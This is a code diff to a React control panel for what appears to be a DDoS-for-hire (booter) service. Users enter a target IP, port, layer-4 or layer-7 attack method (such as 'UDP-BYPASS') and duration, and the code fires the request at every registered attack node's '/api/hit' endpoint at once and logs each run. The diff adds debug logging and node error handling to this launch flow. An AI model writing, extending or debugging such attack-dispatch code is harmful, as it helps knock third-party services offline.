@@ -42,6 +42,8 @@ export default function Panel() {
   const [todayCount,  setTodayCount]  = useState(0);
   const [l4Busy,      setL4Busy]      = useState(false);
   const [l7Busy,      setL7Busy]      = useState(false);
+  const [debugLogs,   setDebugLogs]   = useState([]);
+  const [showDebug,   setShowDebug]   = useState(false);
 
   const currentMethods = layer === "L4" ? l4Methods : l7Methods;
   const durations = ALL_DURATIONS.filter(d => maxDuration === 0 || d <= maxDuration);
@@ -179,6 +181,14 @@ export default function Panel() {
   const l7Blocked = layer === "L7" && l7Busy;
   const layerBlocked = l4Blocked || l7Blocked;
 
+  function dbg(level, msg, detail = null) {
+    const entry = { ts: new Date().toISOString(), level, msg, detail };
+    console[level === "error" ? "error" : level === "warn" ? "warn" : "log"](
+      `[Panel][${level.toUpperCase()}] ${msg}`, detail ?? ""
+    );
+    setDebugLogs(prev => [entry, ...prev].slice(0, 200));
+  }
+
   async function launch(e) {
     e.preventDefault();
     if (!target.trim() || !method || !layer || !duration) return;
@@ -191,11 +201,23 @@ export default function Panel() {
     setLaunchError("");
     setLaunchInfo("");
     setLaunching(true);
+    setShowDebug(true);
+    setDebugLogs([]);
+
+    const startedAt = new Date().toISOString();
+    dbg("info", `Launch started — layer=${layer} method=${method} target=${target.trim()} duration=${duration}s`);
 
     // ── Fire real API calls for L4 UDP methods ──────────────────────────
     let apiInstances = {};
+
     if (layer === "L4" && (method === "UDP-NORMAL" || method === "UDP-BYPASS")) {
-      const { data: apis } = await supabase.from("layer4_apis").select("url");
+      // Fetch API list
+      const { data: apis, error: apiFetchErr } = await supabase.from("layer4_apis").select("url");
+      if (apiFetchErr) {
+        dbg("error", "Failed to fetch layer4_apis from DB", apiFetchErr.message);
+      } else {
+        dbg("info", `Fetched ${apis?.length ?? 0} API node(s) from DB`);
+      }
 
       if (apis && apis.length > 0) {
         const body =
@@ -203,62 +225,95 @@ export default function Panel() {
             ? { method: 1, ip: target.trim(), port: parseInt(port, 10), duration }
             : { method: 2, ip: target.trim(), time: duration };
 
-        // Fire all API nodes simultaneously with a 15 s timeout each
-        // (Replit dev servers can take 10-30 s to cold-start)
+        dbg("info", `Request body`, body);
+        dbg("info", `Firing all ${apis.length} node(s) simultaneously (15 s timeout each)…`);
+
+        // Fire every node simultaneously regardless of online/offline status
         const results = await Promise.allSettled(
           apis.map((api) => {
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), 15000);
-            return fetch(`${api.url}/api/hit`, {
+            const url = `${api.url}/api/hit`;
+            return fetch(url, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(body),
               signal: controller.signal,
             })
-              .then((r) => r.json())
-              .then((data) => ({ url: api.url, instance_id: data.instance_id }))
+              .then((r) => {
+                if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
+                return r.json();
+              })
+              .then((data) => {
+                if (!data?.instance_id) throw new Error(`No instance_id in response: ${JSON.stringify(data)}`);
+                return { url: api.url, instance_id: data.instance_id };
+              })
+              .catch((err) => { throw { url: api.url, err }; })
               .finally(() => clearTimeout(timer));
           })
         );
 
-        results.forEach((r) => {
-          if (r.status === "fulfilled" && r.value?.instance_id) {
+        let onlineCount = 0;
+        results.forEach((r, i) => {
+          const apiUrl = apis[i].url;
+          if (r.status === "fulfilled") {
+            onlineCount++;
             apiInstances[r.value.url] = r.value.instance_id;
+            dbg("info", `✓ ${apiUrl} → instance_id=${r.value.instance_id}`);
+          } else {
+            const rawErr = r.reason;
+            const errMsg = rawErr?.err?.name === "AbortError"
+              ? "timed out (15 s)"
+              : rawErr?.err?.message ?? rawErr?.message ?? String(rawErr);
+            dbg("warn", `✗ ${apiUrl} → ${errMsg}`);
           }
         });
 
-        const hit   = Object.keys(apiInstances).length;
-        const total = apis.length;
-        setLaunchInfo(`${hit}/${total} API${total !== 1 ? "s" : ""} responded`);
+        dbg(
+          onlineCount > 0 ? "info" : "warn",
+          `Result: ${onlineCount}/${apis.length} node(s) responded`
+        );
+        setLaunchInfo(`${onlineCount}/${apis.length} node(s) online`);
+      } else {
+        dbg("warn", "No API nodes registered in layer4_apis table");
+        setLaunchInfo("No API nodes registered");
       }
+    } else {
+      dbg("info", `Method ${method} does not use API nodes — skipping API dispatch`);
     }
 
-    // ── Save run record ─────────────────────────────────────────────────
+    // ── Save run record — always "running" so it appears in Active runs ──
+    // started_at is set immediately; is_l4_busy will reflect it in ≤5 s.
     const table = layer === "L4" ? "l4_runs" : "l7_runs";
-    const hasApiHit = Object.keys(apiInstances).length > 0;
-    // "running"  → at least one API node confirmed receipt (started_at set)
-    // "queued"   → no API responded yet; is_l4/l7_busy still counts this
-    //              via the time-aware DB check, and it shows in Active runs.
-    //              It auto-expires after created_at + duration + 30 s grace.
-    const { error } = await supabase.from(table).insert({
-      user_id:    user.id,
-      target:     target.trim(),
-      method,
-      duration,
-      status:     hasApiHit ? "running" : "queued",
-      started_at: hasApiHit ? new Date().toISOString() : null,
-    });
+    const hitCount = Object.keys(apiInstances).length;
 
-    setLaunching(false);
-    if (error) {
-      setLaunchError("Failed to save run: " + error.message);
+    dbg("info", `Inserting run into ${table} (status=running, started_at=${startedAt})`);
+    const { data: insertedRun, error: insertErr } = await supabase
+      .from(table)
+      .insert({
+        user_id:    user.id,
+        target:     target.trim(),
+        method,
+        duration,
+        status:     "running",
+        started_at: startedAt,
+      })
+      .select("id")
+      .single();
+
+    if (insertErr) {
+      dbg("error", "DB insert failed", insertErr.message);
+      setLaunchError("Failed to save run: " + insertErr.message);
     } else {
+      dbg("info", `Run saved → id=${insertedRun?.id}  nodes_hit=${hitCount}`);
       setTarget("");
       setPort("");
       fetchRuns();
       fetchTodayCount();
       checkBusy();
     }
+
+    setLaunching(false);
   }
 
   async function stopRun(id, _table) {
@@ -472,6 +527,52 @@ export default function Panel() {
                       : "Launch run"}
                   </button>
                 </form>
+              )}
+
+              {/* ── Debug panel ───────────────────────────────────────── */}
+              {debugLogs.length > 0 && (
+                <div className="border-t border-white/[0.06]">
+                  <button
+                    type="button"
+                    onClick={() => setShowDebug(v => !v)}
+                    className="flex w-full items-center justify-between px-5 py-3 text-[10px] uppercase tracking-wider text-muted-foreground hover:text-foreground transition-colors"
+                  >
+                    <span>Debug log ({debugLogs.length} entries)</span>
+                    <span>{showDebug ? "▲ hide" : "▼ show"}</span>
+                  </button>
+                  {showDebug && (
+                    <div className="mx-5 mb-4 max-h-64 overflow-y-auto rounded-lg border border-white/[0.06] bg-black/60 p-3 font-mono text-[10px] leading-relaxed">
+                      {[...debugLogs].reverse().map((e, i) => (
+                        <div key={i} className={`flex gap-2 ${
+                          e.level === "error" ? "text-red-400"
+                          : e.level === "warn"  ? "text-amber-400"
+                          : "text-zinc-400"
+                        }`}>
+                          <span className="shrink-0 text-zinc-600">
+                            {e.ts.slice(11, 23)}
+                          </span>
+                          <span className={`shrink-0 w-8 ${
+                            e.level === "error" ? "text-red-500"
+                            : e.level === "warn" ? "text-amber-500"
+                            : "text-emerald-500"
+                          }`}>
+                            {e.level === "error" ? "ERR" : e.level === "warn" ? "WRN" : "INF"}
+                          </span>
+                          <span className="break-all">
+                            {e.msg}
+                            {e.detail != null && (
+                              <span className="ml-1 text-zinc-500">
+                                {typeof e.detail === "object"
+                                  ? JSON.stringify(e.detail)
+                                  : String(e.detail)}
+                              </span>
+                            )}
+                          </span>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+                </div>
               )}
             </div>
           </section>
